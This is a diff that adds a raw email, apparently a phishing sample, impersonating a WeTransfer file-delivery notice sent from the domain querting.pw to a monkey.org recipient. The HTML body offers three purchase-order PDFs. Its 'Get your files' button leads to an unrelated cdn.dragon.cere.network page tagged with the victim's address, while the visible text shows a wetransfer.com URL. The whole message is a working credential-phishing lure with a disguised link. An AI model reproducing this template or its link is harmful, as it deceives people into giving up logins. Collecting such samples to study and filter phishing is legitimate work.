@@ -1,0 +1,418 @@
+Return-Path: wetransfer@querting.pw
+Delivered-To: jose@monkey.org
+X-FDA: 82886555724.04.05CA79B
+Received: from 0.querting.pw (unknown [194.213.18.33])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP id C2C0116000C
+	for <jose@monkey.org>; Thu, 12 Dec 2024 14:35:33 +0000 (UTC)
+Authentication-Results: imf22.b.hostedemail.com;	dkim=pass
+ header.d=querting.pw header.s=default header.b=b4RqPbHQ;	spf=pass
+ (imf22.b.hostedemail.com: domain of wetransfer@querting.pw designates
+ 194.213.18.33 as permitted sender) smtp.mailfrom=wetransfer@querting.pw;
+	dmarc=pass (policy=reject) header.from=querting.pw
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1734014138;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=GAIoZLJQusOvC5Km2zR9JeTx2knx+0oteEVD5uDmWtU=;
+	b=Ay1yJR7pU0ehl/CGSVcbgDsuszK9YY+5Hh1f99tRKrpmm79SLaoK1E8MRZCH4rIsLc6vbz
+	2zLbbgfsDKF/oXwr9LR6+JzxZ1cUOYFeAD3lxjNKqJULbcSWmF8qmWI0U29Gfg7MEgjoeY
+	AQ7ZFBxqEjiDvN64RutasOG7zRienm8=
+ARC-Authentication-Results: i=1;	imf22.b.hostedemail.com;	dkim=pass
+ header.d=querting.pw header.s=default header.b=b4RqPbHQ;	spf=pass
+ (imf22.b.hostedemail.com: domain of wetransfer@querting.pw designates
+ 194.213.18.33 as permitted sender) smtp.mailfrom=wetransfer@querting.pw;
+	dmarc=pass (policy=reject) header.from=querting.pw
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1734014138; a=rsa-sha256;
+	cv=none;
+	b=5Y9RKNRE6CoyURINMBJaS+udAD8crQDFyx8jPKq/ctc9T5lUqM5BK1PL7+gixmYFXAkeUF
+	gzmo5+eC/1ulqyLwor6914b/nJmau1bHT2vrx4hfLGXW7vAJTFeH35hEudb299OXAakd2S
+	AYkFUPRGw8gih69OpMnPmRWlWQ1xhI0=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
+ d=querting.pw; h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=wetransfer@querting.pw;
+ bh=GAIoZLJQusOvC5Km2zR9JeTx2knx+0oteEVD5uDmWtU=; =?utf-8?q?b=3Db4RqPbHQtZS+?=
+ =?utf-8?q?7IQY6O1hR9fQiWyNx4hnZGbTdE6zbhnMINp0lXdpP6TBNrd6Vksa4HW0X/lmjdHc?=
+  
+ JacdWW2QIK+j3rAKM0UIaNBW+ydMtIkVf3A59zDBNHCQ7VUQF7J6XPZ3RKBf2DYHLOyysaZ9wy6s
+   z+bGYBdu4JGT46rQXdE=
+From: WeTransfer <wetransfer@querting.pw>
+To: jose@monkey.org
+Subject: You received some files via WeTransfer
+Date: 12 Dec 2024 06:35:56 -0800
+Message-ID: <20241212063556.0C9C6C3BEA5548D3@querting.pw>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Server: rspam02
+X-Rspamd-Queue-Id: C2C0116000C
+X-Spam-Status: Yes, score=10.80
+X-Stat-Signature: h3zm8j8trpnmc57um1ow65ae9br93mx9
+X-HE-Tag: 1734014133-503694
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19pXw0LpL0M6HzyUX+I6FlHxtWp1W3Kc0lYg9hiKvNQl/f?=
+ =?utf-8?q?RroAiBmAvWGkNwKldE7ZbhlVrUl/1Wq2ubkAeFL5QtLdbc6Sk7peW5F+ZXpU+Vba9?=
+ =?utf-8?q?FuhnMsDf5C5BPj3jbNvZ4lnO79WSSaYc6hfOsT5dm4vaO5vY/sccjmufeXrKSzqch?=
+ =?utf-8?q?YNPjtHs3ZnPAnHG7dabOwMl/YSL8zsFTMZ5sotSYzAcDMOPFQgS4FX13cXnGO2Qg7?=
+ =?utf-8?q?HxuBoYGFvUASab5ddDQmr64FzDttovKGXzdK4MuWa/yztoh3cj8NV36x533AhVC8M?=
+ =?utf-8?q?9MyTKjmH6VgNLmCrhOYC3Qo7n1sXfqGk9+eG85CXkSHh1YYrMETqEogKNdLZzFdBw?=
+ =?utf-8?q?5kv6TgL49LykrdbkZMSyZQeyLzXV00MVZX4tkuSz58O9w9vUNEieiIl0QTFYfbgA7?=
+ =?utf-8?q?LAC/fzhERR7cU/h8sNe9uoDwp4NhSNg3Ael/iVoOxe593sqh3yTXS7nhBVKTBg2Bb?=
+ =?utf-8?q?4YMHu6E1F2L6rg+NQZ1/Az16h3H52w1thkZ4JiTGH1bPhuGwIio0EmLJnowKbcFJg?=
+ =?utf-8?q?ztMrfeXwm0opjxQh3erbSM3fdgxy0HzkTSjQfC/aFTEp/uv4Gd7il0G+2fNRc3p49?=
+ =?utf-8?q?YmwIWRb7k5gGmc+AhpALQifFdvIng3iCEowIU7Izmw+GT4Xv7tMcUw0rO8giHMVLa?=
+ =?utf-8?q?Cr8oQf8oKE2wd1dgOTGp2OVTQGD11M2N01TUV3xP6Yxv9sE4r/Pw6rghnKvg39lvr?=
+ =?utf-8?q?HMemyw28OxQzjB9NITjGrNqYOci1SeCxfiOwrADFbCrGvk5X3jOTGvbCrSTxAahz2?=
+ =?utf-8?q?HTdy14h2Fr/FCQTJkwklJoY8j9s+ByxquiLI/cMN6RcUBZkinfFYsburO7Yh9VsG3?=
+ =?utf-8?q?SIXEBWJJOy6iElYJneQSHo2tGbvw9bND6TWrP6hgpMYG3qyu6x78myKzYuCM56EPg?=
+ =?utf-8?q?/rJ+KyWIz7/nfryhae+/L7_qo9PamxBfNu9FNdehksZ5p9EIsxiHZrzz5wR3LRk0p?=
+ =?utf-8?q?7Hj0mIyhsGTwEMFZlyw+AUL2IBtoxi5keaiJBlJ7tdbI67y3q8sL+/sb5HB6l2/wT?=
+ =?utf-8?q?ndeFMeR8xyRFHBp7+sEPOe1hSBEc+wzkAOtUrmTZDoTv9Q/ksUnkKbEsIBbj/d7Yn?=
+ =?utf-8?q?LVm6KGau5Uc0zSn6H080N49HOoWWxRhAqHDPXLU/RBAfAhqJrO11h/s818QZkZQKc?=
+ =?utf-8?q?pu5CkEDgiWAPlRBeTgtiPsTgD8lskZOwcraJcblVdykrhxR6KoiOxrT2WO7ECzy3O?=
+ =?utf-8?q?iWgp2hMT2sApASOudkCRGUOghpUhluvc71aFMVhkVcAnP9KnlEkUl2SxnY0CjABj2?=
+ =?utf-8?q?AN5SBPXP93K3J0sJ/cl0xZZ0r0ad46vws=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 388
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge"></head>
+<body>
+<div class=3D"ydp783f8cc8yahoo-style-wrap" style=3D"font-family: Helvetica =
+Neue, Helvetica, Arial, sans-serif; font-size: 13px;">
+<div id=3D"ydp783f8cc8yiv9880020113">
+<div>
+<div class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yahoo-style-wrap" style=3D=
+"font-family: Helvetica Neue, Helvetica, Arial, sans-serif; font-size: 13px=
+;">
+<div id=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121">
+<div>
+<div class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-style-w=
+rap" style=3D"font-family: Helvetica Neue, Helvetica, Arial, sans-serif; fo=
+nt-size: 13px;">
+<div dir=3D"ltr">
+<div>
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 784px; text-align: left; color: r=
+gb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: =
+Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal;=20
+border-collapse: collapse; table-layout: fixed; border-spacing: 0px; backgr=
+ound-color: rgb(255, 255, 255); text-decoration-style: initial; text-decora=
+tion-color: initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 55px 0px 0=
+px; width: 784px;">
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 784px; border-collapse: collapse;=
+ table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 784px; font-size: 10px;" bgcolor=3D"#409fff">
+<center>
+<table align=3D"center" class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412=
+894121yahoo-compose-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-com=
+pose-table-card ydp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-comp=
+ose-table-card" style=3D"margin: 0px auto; padding: 0px; border-collapse: c=
+ollapse; table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacin=
+g=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 0px; min-height: 16px;">&nbsp;</td></tr>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 0px;">&nbsp;</td></tr></tbody></table></center></td></tr></tbody></table>=
+</td></tr></tbody></table>
+<p style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif;=
+ font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; wo=
+rd-spacing: 0px; white-space: normal; background-color: rgb(255, 255, 255);=
+ text-decoration-style: initial; text-decoration-color: initial;">&nbsp;</p=
+>
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 784px; text-align: left; color: r=
+gb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: =
+Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal;=20
+border-collapse: collapse; table-layout: fixed; border-spacing: 0px; text-d=
+ecoration-style: initial; text-decoration-color: initial;" bgcolor=3D"white=
+" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 784px;">
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 784px; border-collapse: collapse;=
+ table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 784px;">
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 784px; border-collapse: collapse;=
+ table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"middle" valign=3D"top" style=3D"margin: 0px; padding: 60px 80p=
+x 0px; width: 784px; color: rgb(23, 24, 26); line-height: 30px; font-family=
+: Arial, sans-serif; font-size: 26px; font-style: normal; font-weight: norm=
+al; word-spacing: 0px;">
+<h2 class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121ydpc77f4e7fv1s=
+ubject" style=3D"line-height: 1.2; font-size: 1.5em; font-weight: bold; mar=
+gin-top: 0px;">jose@monkey.org</h2><br>You received some files via wetransf=
+er</td></tr>
+<tr>
+<td align=3D"middle" valign=3D"top" style=3D"margin: 0px; padding: 20px 80p=
+x 0px; width: 784px; color: rgb(106, 109, 112); line-height: 23px; font-fam=
+ily: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: n=
+ormal; word-spacing: 0px;">3 items, 96 MB in total &middot; Expires on&nbsp=
+;14th December, 2024</td></tr>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 40px 160px=
+ 0px; width: 784px;">
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 464px; border-collapse: collapse;=
+ table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 464px;">
+<a style=3D"padding: 15px 20px; border-radius: 25px; text-align: center; co=
+lor: white; font-family: Pro Arial, sans-serif; font-size: 14px; font-style=
+: normal; word-spacing: 0px; display: block; background-color: rgb(64, 159,=
+ 255); text-decoration-style: solid; text-decoration-color: currentcolor; t=
+ext-decoration-line: none;" href=3D"https://cdn.dragon.cere.network/1186/ba=
+ear4ibj52ceu7tj43lhluftwkslgfx7rz7npb2lat2lomiaemoqb3rtdm/elpitiok.html?sou=
+rce=3Ddeveloper-console#jose@monkey.org" target=3D"_blank"=20
+rel=3D"nofollow &#13;&#10;noopener">
+Get your files</a></td></tr></tbody></table></td></tr>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 40px 80px =
+0px; width: 784px;">
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 624px; border-collapse: collapse;=
+ table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 624px; line-height: 0; font-size: 1px; border-bottom-color: rgb(244, 244,=
+ 244); border-bottom-width: 2px; border-bottom-style: solid;">&nbsp;</td></=
+tr></tbody></table></td></tr>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 50px 80px =
+0px; width: 784px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
+y: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: nor=
+mal; word-spacing: 0px;"><span style=3D"color: rgb(23, 24, 26); font-family=
+: Arial, sans-serif, serif, EmojiFont; font-size: 18px; font-weight: 500;">=
+Download link</span><br>
+<a style=3D"color: rgb(23, 24, 26); font-family: Pro Arial, sans-serif; fon=
+t-weight: normal; background-color: transparent; text-decoration-style: sol=
+id; text-decoration-color: currentcolor; text-decoration-line: underline;" =
+href=3D"https://cdn.dragon.cere.network/1186/baear4ibj52ceu7tj43lhluftwkslg=
+fx7rz7npb2lat2lomiaemoqb3rtdm/elpitiok.html?source=3Ddeveloper-console#jose=
+@monkey.org" target=3D"_blank" rel=3D"nofollow noopener">
+<span style=3D"color: rgb(64, 159, 255); font-weight: normal; text-decorati=
+on-style: solid; text-decoration-color: currentcolor; text-decoration-line:=
+ underline;">https://<span class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6=
+412894121ydpc77f4e7fv1v1marky67ace8m6">wetransfer</span>.com/downloads/9515=
+3613ffb5af6705eaaab73abb9c2f20200622103720/520bdbac9de5b6d32d08cd5d0c842cd2=
+20200622103757/d55af0</span></a></td></tr>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 50px 80px =
+0px; width: 784px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
+y: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: nor=
+mal; word-spacing: 0px;"><span style=3D"color: rgb(23, 24, 26); font-family=
+: Arial, sans-serif, serif, EmojiFont; font-size: 18px; font-weight: 500;">=
+3 items</span></td></tr>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px 80px 5=
+0px; width: 784px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
+y: Arial, sans-serif; font-size: 14px; font-style: normal; font-weight: nor=
+mal; word-spacing: 0px;">
+<div style=3D"color: rgb(23, 24, 26); font-family: Arial, sans-serif, serif=
+, EmojiFont; font-size: 18px; font-weight: 500;">&nbsp;</div>
+<div style=3D"padding: 9px 0px 7px; border-bottom-color: rgb(244, 244, 244)=
+; border-bottom-width: 1px; border-bottom-style: solid;">
+<div style=3D"color: rgb(23, 24, 26); line-height: 16px; font-family: Arial=
+, sans-serif, serif, EmojiFont; font-size: 14px; font-style: normal; font-w=
+eight: normal; word-spacing: 0px;">Purchase Order .pdf</div>
+<div style=3D"color: rgb(106, 109, 112); line-height: 16px; font-size: 12px=
+;">76.9 MB</div></div>
+<div style=3D"padding: 9px 0px 7px; border-bottom-color: rgb(244, 244, 244)=
+; border-bottom-width: 1px; border-bottom-style: solid;">
+<div style=3D"color: rgb(23, 24, 26); line-height: 16px; font-family: Arial=
+, sans-serif, serif, EmojiFont; font-size: 14px; font-style: normal; font-w=
+eight: normal; word-spacing: 0px;">List of Items.pdf</div>
+<div style=3D"color: rgb(106, 109, 112); line-height: 16px; font-size: 12px=
+;">7.83 MB</div></div>
+<div style=3D"padding: 9px 0px 7px; border-bottom-color: rgb(244, 244, 244)=
+; border-bottom-width: 1px; border-bottom-style: none;">
+<div style=3D"color: rgb(23, 24, 26); line-height: 16px; font-family: Arial=
+, sans-serif, serif, EmojiFont; font-size: 14px; font-style: normal; font-w=
+eight: normal; word-spacing: 0px;">Specifications.pdf</div>
+<div style=3D"color: rgb(106, 109, 112); line-height: 16px; font-size: 12px=
+;">5.79 MB</div></div></td></tr></tbody></table></td></tr></tbody></table><=
+/td></tr></tbody></table>
+<p style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif;=
+ font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; wo=
+rd-spacing: 0px; white-space: normal; background-color: rgb(255, 255, 255);=
+ text-decoration-style: initial; text-decoration-color: initial;">&nbsp;</p=
+>
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 784px; text-align: left; color: r=
+gb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: =
+Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal;=20
+border-collapse: collapse; table-layout: fixed; border-spacing: 0px; backgr=
+ound-color: rgb(255, 255, 255); text-decoration-style: initial; text-decora=
+tion-color: initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 2px 0px 0p=
+x; width: 784px;">
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 784px; border-collapse: collapse;=
+ table-layout: fixed; border-spacing: 0px;" bgcolor=3D"white" border=3D"0" =
+cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px 20px; =
+width: 784px;">
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 744px; border-collapse: collapse;=
+ table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"middle" valign=3D"top" style=3D"margin: 0px; padding: 13px 0px=
+; width: 744px; color: rgb(121, 124, 127); line-height: 24px; font-family: =
+Arial, sans-serif; font-size: 12px; font-style: normal; font-weight: normal=
+; word-spacing: 0px;">
+<p style=3D"margin: 0px; padding: 0px;">To make sure our emails arrive, ple=
+ase add&nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; ba=
+ckground-color: transparent; text-decoration-style: solid; text-decoration-=
+color: currentcolor; text-decoration-line: none;" href=3D"http://webmail.de=
+toenategroup.com/#NOP" target=3D"_blank" rel=3D"nofollow noopener"><span st=
+yle=3D"color: rgb(121, 124, 127); font-weight: normal;">
+ noreply@<span class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121ydp=
+c77f4e7fv1v1marky67ace8m6">wetransfer</span>.com</span></a>
+ &nbsp;to&nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; =
+background-color: transparent; text-decoration-style: solid; text-decoratio=
+n-color: currentcolor; text-decoration-line: underline;" href=3D"https://we=
+transfer.zendesk.com/hc/en-us/articles/204909429?utm_campaign=3DWT_email_tr=
+acking&amp;utm_source=3Dnotify_recipient_email&amp;utm_medium=3DAdd+Us+To+Y=
+our+Contacts+Link&amp;utm_content=3Dgeneral" target=3D"_blank" rel=3D"nofol=
+low noopener">your contacts</a>.</p></td></tr></tbody></table>
+</td></tr></tbody>
+</table></td></tr></tbody></table>
+<p style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif;=
+ font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; wo=
+rd-spacing: 0px; white-space: normal; background-color: rgb(255, 255, 255);=
+ text-decoration-style: initial; text-decoration-color: initial;">&nbsp;</p=
+>
+<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
+se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
+dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
+tyle=3D"margin: 0px; padding: 0px; width: 784px; text-align: left; color: r=
+gb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: =
+Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal;=20
+border-collapse: collapse; table-layout: fixed; border-spacing: 0px; backgr=
+ound-color: rgb(255, 255, 255); text-decoration-style: initial; text-decora=
+tion-color: initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"middle" valign=3D"top" style=3D"margin: 0px; padding: 30px 20p=
+x; width: 784px; color: rgb(121, 124, 127); line-height: 23px; font-family:=
+ Arial, sans-serif; font-size: 12px; font-style: normal; font-weight: norma=
+l; word-spacing: 0px;">
+<a style=3D"color: rgb(121, 124, 127); font-weight: normal; background-colo=
+r: transparent; text-decoration-style: solid; text-decoration-color: curren=
+tcolor; text-decoration-line: underline;" href=3D"https://wetransfer.com/ab=
+out?utm_campaign=3DWT_email_tracking&amp;utm_content=3Dgeneral&amp;utm_medi=
+um=3Dabout_link&amp;utm_source=3Dnotify_recipient_email" target=3D"_blank" =
+rel=3D"nofollow noopener">
+<span style=3D"color: rgb(121, 124, 127); font-weight: normal; text-decorat=
+ion-style: solid; text-decoration-color: currentcolor; text-decoration-line=
+: underline;">About&nbsp;<span class=3D"ydp783f8cc8yiv9880020113ydpe30d4861=
+yiv6412894121ydpc77f4e7fv1v1marky67ace8m6">WeTransfer</span></span></a>&nbs=
+p;<span style=3D"color: rgb(121, 124, 127);">&nbsp;&nbsp;&middot;&nbsp;&nbs=
+p;</span>
+ &nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; backgrou=
+nd-color: transparent; text-decoration-style: solid; text-decoration-color:=
+ currentcolor; text-decoration-line: underline;" href=3D"https://wetransfer=
+=2Ezendesk.com/hc/en-us?utm_campaign=3DWT_email_tracking&amp;utm_source=3Dn=
+otify_recipient_email&amp;utm_medium=3DFooter+Help+Link&amp;utm_content=3Dg=
+eneral" target=3D"_blank" rel=3D"nofollow noopener">
+ <span style=3D"color: rgb(121, 124, 127); font-weight: normal; text-decora=
+tion-style: solid; text-decoration-color: currentcolor; text-decoration-lin=
+e: underline;">Help</span></a>&nbsp;<span style=3D"color: rgb(121, 124, 127=
+);">&nbsp;&nbsp;&middot;&nbsp;&nbsp;</span>
+ &nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; backgrou=
+nd-color: transparent; text-decoration-style: solid; text-decoration-color:=
+ currentcolor; text-decoration-line: underline;" href=3D"https://wetransfer=
+=2Ecom/legal/terms?utm_campaign=3DWT_email_tracking&amp;utm_content=3Dgener=
+al&amp;utm_medium=3Dlegal_link&amp;utm_source=3Dnotify_recipient_email" tar=
+get=3D"_blank" rel=3D"nofollow noopener">
+ <span style=3D"color: rgb(121, 124, 127); font-weight: normal; text-decora=
+tion-style: solid; text-decoration-color: currentcolor; text-decoration-lin=
+e: underline;">Legal</span>&nbsp;</a><span style=3D"color: rgb(121, 124, 12=
+7);">&nbsp;&nbsp;&middot;&nbsp;&nbsp;</span>
+ &nbsp;<a style=3D"color: rgb(121, 124, 127); font-weight: normal; backgrou=
+nd-color: transparent; text-decoration-style: solid; text-decoration-color:=
+ currentcolor; text-decoration-line: underline;"=20
+href=3D"https://wetransfer.zendesk.com/hc/en-us/requests/new?ticket_form_id=
+=3D360000007663&amp;utm_campaign=3DWT_email_tracking&amp;utm_source=3Dnotif=
+y_recipient_email&amp;utm_medium=3DSpam+Support+Link&amp;utm_content=3Dgene=
+ral&amp;token=3DeyJhbGciOiJub25lIn0.eyJyZXF1ZXN0X3N1YmplY3QiOiJSZXBvcnQgdGh=
+pcyB0cmFuc2ZlciBhcyBzcGFtIiwicmVxdWVzdF9kZXNjcmlwdGlvbiI6Imh0dHBzOi8vd2V0cm=
+Fuc2Zlci5jb20vZG93bmxvYWRzLzk1MTUzNjEzZmZiNWFmNjcwNWVhYWFiNzNhYmI5YzJmMjAyM=
+DA2MjIxMDM3MjAvNTIwYmRiYWM5ZGU1YjZkMzJkMDhjZDVkMGM4NDJjZDIyMDIwM
+&#10;&#10;DYyMjEwMzc1Ny9kNTVhZjAiLCJyZXF1ZXN0X2Fub255bW91c19yZXF1ZXN0ZXJfZW=
+1haWwiOiJyLndvb2RzQHBkc2Rlc2lnbi1idWlsZC5jby51ayIsInJlcXVlc3RfY3VzdG9tX2ZpZ=
+Wxkc18zNjAwMDAxNzEyMjMiOiIwZjRlZjEzZmNlNDcyMzZkOGNjMDQ5ZjZkMGQyMGYzNzI2YWMw=
+MDFhMWFmZDMzNmYxYzkyOWM2MzY5ZjhlYzA4MjdhOWRiNTM2ZWMyM2I2MjQwOGUxMTdmYTcyYjk=
+yZDQ3M2Y4Yzg4NzRkYTI0OWI1MjMxY2Y2N2M4MDc3MGMyZiJ9." target=3D"_blank" rel=
+=3D"nofollow noopener">
+ <span style=3D"color: rgb(121, 124, 127); font-weight: normal; text-decora=
+tion-style: solid; text-decoration-color: currentcolor; text-decoration-lin=
+e: underline;">Report this transfer as spam</span></a></td></tr></tbody></t=
+able></div>
+<div>&nbsp;</div></div></div></div></div></div></div></div></div></body></h=
+tml>
+
